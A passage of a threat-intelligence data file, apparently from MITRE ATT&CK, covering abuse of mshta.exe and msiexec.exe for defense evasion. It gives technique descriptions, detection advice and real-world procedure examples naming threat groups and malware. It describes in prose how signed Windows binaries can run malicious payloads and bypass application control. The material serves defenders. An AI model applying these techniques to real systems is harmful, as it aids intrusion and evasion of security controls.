compromised hosts.","[G1018] TA2541: TA2541 has used `mshta` to execute scripts including VBS.","[S1213] Lumma Stealer: Lumma Stealer has used mshta.exe to execute additional content.","[G0082] APT38: APT38 has used a renamed version of `mshta.exe` to execute malicious HTML files.","[S0455] Metamorfo: Metamorfo has used mshta.exe to execute a HTA payload.","[G0100] Inception: Inception has used malicious HTA files to drop and execute malware.","[G0094] Kimsuky: Kimsuky has used mshta.exe to run malicious scripts on the system.","[G0046] FIN7: FIN7 has used mshta.exe to execute VBScript to execute malicious code on victim systems.","[S0379] Revenge RAT: Revenge RAT uses mshta.exe to run malicious scripts on the system.","[G1006] Earth Lusca: Earth Lusca has used `mshta.exe` to load an HTA script within a malicious .LNK file.","[G0050] APT32: APT32 has used mshta.exe for code execution.","[S0228] NanHaiShu: NanHaiShu uses mshta.exe to load its program and files.","[S0589] Sibot: Sibot has been executed via MSHTA application.","[C0016] Operation Dust Storm: During Operation Dust Storm, the threat actors executed JavaScript code via `mshta.exe`.","[G0016] APT29: APT29 has use `mshta` to execute malicious scripts on a compromised host.","[G0142] Confucius: Confucius has used mshta.exe to execute malicious VBScript.","[S1155] Covenant: Covenant can create HTA files to install Grunt listeners.","[S0147] Pteranodon: Pteranodon can use mshta.exe to execute an HTA file hosted on a remote server.","[G0127] TA551: TA551 has used mshta.exe to execute malicious payloads.","[G1008] SideCopy: SideCopy has utilized `mshta.exe` to execute a malicious hta file.","[G0047] Gamaredon Group: Gamaredon Group has used `mshta.exe` to execute malicious files.","[C0015] C0015: During C0015, the threat actors used `mshta` to execute DLLs."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1218.007","technique_name":"System Binary Proxy Execution: Msiexec","description":"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). The Msiexec.exe binary may also be digitally signed by Microsoft. Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the AlwaysInstallElevated policy is enabled.","detection":"Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.","procedures":["[S0631] Chaes: Chaes has used .MSI files as an initial way to start the infection chain.","[G0021] Molerats: Molerats has used msiexec.exe to execute an MSI payload.","[S0038] Duqu: Duqu has used msiexec to execute malicious Windows Installer packages. Additionally, a PROPERTY=VALUE pair containing a 56-bit encryption key has been used to decrypt the main payload from the installer packages.","[S0455] Metamorfo: Metamorfo has used MsiExec.exe to automatically execute files.","[S1160] Latrodectus: Latrodectus has called `msiexec` to install remotely-hosted MSI files.","[S1052] DEADEYE: DEADEYE can use `msiexec.exe` for execution of malicious DLL.","[S0483] IcedID: IcedID can inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application. IcedID has also used msiexec.exe to deploy the IcedID loader.","[S1122] Mispadu: Mispadu has been installed via MSI installer.","[S0662] RCSession: RCSession has the ability to execute inside the msiexec.exe process.","[G0092] TA505: TA505 has used msiexec to download and execute malicious Windows Installer files.","[S0530] Melcoz: Melcoz can use MSI files with embedded VBScript for execution.","[S0650] QakBot: QakBot can use MSIExec to spawn multiple cmd.exe processes.","[S0531] Grandoreiro: Grandoreiro can use MSI files to execute DLLs.","[S0584] AppleJeus: AppleJeus has been installed via MSI installer.","[S0528] Javali: Javali has used the MSI installer to download and execute malicious payloads.","[S0481] Ragnar Locker: Ragnar Locker has been delivered as an unsigned MSI package that was executed with msiexec.exe.","[C0047] RedDelta Modified PlugX Infection Chain Operations: Mustang Panda initial payloads downloaded a Windows Installer MSI file that in turn dropped follow-on files leading to installation of PlugX during RedDelta Modified PlugX Infection Chain Operations.","[G0075] Rancor: Rancor has used msiexec to download and execute malicious installer files over HTTP.","[G0128] ZIRCONIUM: ZIRCONIUM has used the msiexec.exe command-line utility to download and execute malicious MSI files.","[G0095] Machete: Machete has used msiexec to install the Machete malware.","[S1130] Raspberry Robin: Raspberry Robin uses msiexec.exe for post-installation communication to command and control infrastructure. Msiexec.exe is executed referencing a remote resource for second-stage payload retrieval and execution.","[G0082] APT38: APT38 has used `msiexec.exe` to execute malicious files.","[S0451] LoudMiner: LoudMiner used an MSI installer to install the virtualization software.","[S0449] Maze: Maze has delivered components for its ransomware attacks using MSI files, some of which have been executed from the command-line using msiexec.","[S0592] RemoteUtilities: RemoteUtilities can use Msiexec to install a service.","[S0381] FlawedAmmyy: FlawedAmmyy has been installed via `msiexec.exe`.","[S0611] Clop: Clop can use msiexec.exe to disable security tools on the system."],"tactics":"TA0005 - Defense Evasion"}